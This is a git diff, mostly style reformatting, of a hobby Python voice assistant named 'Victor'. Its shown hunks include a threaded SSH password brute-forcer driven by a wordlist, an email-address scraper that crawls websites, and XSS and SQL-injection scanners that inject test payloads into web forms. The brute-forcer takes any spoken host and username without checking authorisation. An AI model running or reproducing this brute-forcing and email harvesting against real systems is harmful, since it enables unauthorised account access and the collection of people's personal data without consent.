@@ -5,8 +5,6 @@ Created on Mon Apr 24 12:19:32 2023
 @author: Strange
 """
 
-#no commit
-
 import pyttsx3
 import datetime
 import speech_recognition as sr
@@ -21,8 +19,12 @@ import requests.exceptions
 import urllib.parse
 from collections import deque
 import re
-import paramiko, sys, os, termcolor
-import threading, time
+import paramiko
+import sys
+import os
+import termcolor
+import threading
+import time
 from IPy import IP
 import requests
 from pprint import pprint
@@ -30,7 +32,7 @@ from bs4 import BeautifulSoup as bs
 from urllib.parse import urljoin
 
 
-engine =pyttsx3.init('sapi5')
+engine = pyttsx3.init('sapi5')
 voices = engine.setProperty('rate', 205)
 voices = engine.getProperty('voices')
 engine.setProperty('voice', voices[0].id)
@@ -40,15 +42,17 @@ def speak(audio):
     engine.say(audio)
     engine.runAndWait()
 
+
 def wishme():
-    hour=int(datetime.datetime.now().hour)
-    if hour >= 0 and hour<12:
+    hour = int(datetime.datetime.now().hour)
+    if hour >= 0 and hour < 12:
         speak("Good Morning sir!")
-    elif hour >=12 and hour<18:
+    elif hour >= 12 and hour < 18:
         speak("Good Afternoon sir!")
     else:
         speak("Good evening sir!")
     speak("I am Victor.")
+
 
 def takecommand():
     r = sr.Recognizer()
@@ -65,7 +69,8 @@ def takecommand():
             print("Say that again..")
             return "None"
         return query
-        
+
+
 if __name__ == "__main__":
     wishme()
     while True:
@@ -73,14 +78,13 @@ if __name__ == "__main__":
 
         if 'wikipedia' in query:
             speak('Let me search it..')
-            query = query.replace("wikipedia","")
+            query = query.replace("wikipedia", "")
             results = wikipedia.summary(query, sentences=2)
             speak("According to wikipedia")
             print(results)
             speak(results)
- 
 
-        elif 'your capabilities'in query:
+        elif 'your capabilities' in query:
             speak("I can find ip of any domain, scrap emails, bruteforce ssh connection, scan port and grab banners and specificically find vulnerabilities")
 
         elif 'my ip' in query:
@@ -88,12 +92,11 @@ if __name__ == "__main__":
             print("YOUR IP IS " + socket.gethostbyname(hostname))
             speak("Your ip is" + socket.gethostbyname(hostname))
 
-
         elif 'what is the ip' in query:
             data = query.split()
             for temp in data:
                 if '.' in temp:
-                    url=temp
+                    url = temp
             ip = socket.gethostbyname(url)
             print("THE IP FOR " + url + " IS "+ip)
             speak("The ip for " + url + "is "+ip)
@@ -102,7 +105,7 @@ if __name__ == "__main__":
             data = query.split()
             for temp in data:
                 if '.' in temp:
-                    user_url=temp
+                    user_url = temp
             urls = deque([user_url])
 
             scraped_urls = set()
@@ -128,7 +131,8 @@ if __name__ == "__main__":
                     except (requests.exceptions.MissingSchema, requests.exceptions.ConnectionError):
                         continue
 
-                    new_emails = set(re.findall(r"[a-z0-9\.\-+_]+@[a-z0-9\.\-+_]+\.[a-z]+", response.text, re.I))
+                    new_emails = set(re.findall(
+                        r"[a-z0-9\.\-+_]+@[a-z0-9\.\-+_]+\.[a-z]+", response.text, re.I))
                     emails.update(new_emails)
 
                     soup = BeautifulSoup(response.text, features="lxml")
@@ -155,21 +159,26 @@ if __name__ == "__main__":
                 ssh = paramiko.SSHClient()
                 ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                 try:
-                    ssh.connect(host, port=22, username=username, password=password)
+                    ssh.connect(host, port=22, username=username,
+                                password=password)
                     stop_flag = 1
-                    print(termcolor.colored(('[+] Found Password: ' + password + ', For Account: ' + username), 'green'))
+                    print(termcolor.colored(
+                        ('[+] Found Password: ' + password + ', For Account: ' + username), 'green'))
                 except:
-                    print(termcolor.colored(('[-] Incorrect Login: ' + password), 'red'))
+                    print(termcolor.colored(
+                        ('[-] Incorrect Login: ' + password), 'red'))
                 ssh.close()
             speak("specify the host")
             host = takecommand()
             speak("specify the username")
             username = takecommand()
-            
+
             print('\n')
 
-            speak('Starting Threaded SSH Bruteforce On ' + host + ' With Account: ' + username)
-            print('* * * Starting Threaded SSH Bruteforce On ' + host + ' With Account: ' + username + '* * *')
+            speak('Starting Threaded SSH Bruteforce On ' +
+                  host + ' With Account: ' + username)
+            print('* * * Starting Threaded SSH Bruteforce On ' +
+                  host + ' With Account: ' + username + '* * *')
 
             passwords = 'passwords.txt'
             with open(passwords, 'r') as file:
@@ -201,7 +210,6 @@ if __name__ == "__main__":
                 details["inputs"] = inputs
                 return details
 
-
             def submit_form(form_details, url, value):
                 target_url = urljoin(url, form_details["action"])
                 inputs = form_details["inputs"]
@@ -219,7 +227,6 @@ if __name__ == "__main__":
                 else:
                     return requests.get(target_url, params=data)
 
-
             def scan_xss(url):
                 forms = get_all_forms(url)
                 print(f"[+] Detected {len(forms)} forms on {url}.")
@@ -227,7 +234,8 @@ if __name__ == "__main__":
                 is_vulnerable = False
                 for form in forms:
                     form_details = get_form_details(form)
-                    content = submit_form(form_details, url, js_script).content.decode()
+                    content = submit_form(
+                        form_details, url, js_script).content.decode()
                     if js_script in content:
                         print(f"[+] XSS Detected on {url}")
                         print(f"[*] Form details:")
@@ -263,7 +271,8 @@ if __name__ == "__main__":
                     input_type = input_tag.attrs.get("type", "text")
                     input_name = input_tag.attrs.get("name")
                     input_value = input_tag.attrs.get("value", "")
-                    inputs.append({"type": input_type, "name": input_name, "value": input_value})
+                    inputs.append(
+                        {"type": input_type, "name": input_name, "value": input_value})
                 details["action"] = action
                 details["method"] = method
                 details["inputs"] = inputs
@@ -283,14 +292,14 @@ if __name__ == "__main__":
                         return True
                 return False
 
-
             def scan_sql_injection(url):
                 for c in "\"'":
                     new_url = f"{url}{c}"
                     print("[!] Trying", new_url)
                     res = s.get(new_url)
                     if is_vulnerable(res):
-                        print("[+] SQL Injection vulnerability detected, link:", new_url)
+                        print(
+                            "[+] SQL Injection vulnerability detected, link:", new_url)
                         return
                 forms = get_all_forms(url)
                 print(f"[+] Detected {len(forms)} forms on {url}.")
@@ -301,7 +310,8 @@ if __name__ == "__main__":
                         for input_tag in form_details["inputs"]:
                             if input_tag["value"] or input_tag["type"] == "hidden":
                                 try:
-                                    data[input_tag["name"]] = input_tag["value"] + c
+                                    data[input_tag["name"]
+                                         ] = input_tag["value"] + c
                                 except:
                                     pass
                             elif input_tag["type"] != "submit":
@@ -312,21 +322,19 @@ if __name__ == "__main__":
                         elif form_details["method"] == "get":
                             res = s.get(url, params=data)
                         if is_vulnerable(res):
-                            print("[+] SQL Injection vulnerability detected, link:", url)
+                            print(
+                                "[+] SQL Injection vulnerability detected, link:", url)
                             print("[+] Form:")
                             pprint(form_details)
-                            break   
+                            break
 
             if __name__ == "__main__":
                 import sys
-                url = "http://testphp.vulnweb.com/artists.php?artist=1" 
+                url = "http://testphp.vulnweb.com/artists.php?artist=1"
                 scan_sql_injection(url)
 
         elif 'go to sleep' in query:
             sys.exit()
-       
+
         else:
             speak("I didn't understand you")
-
-
-
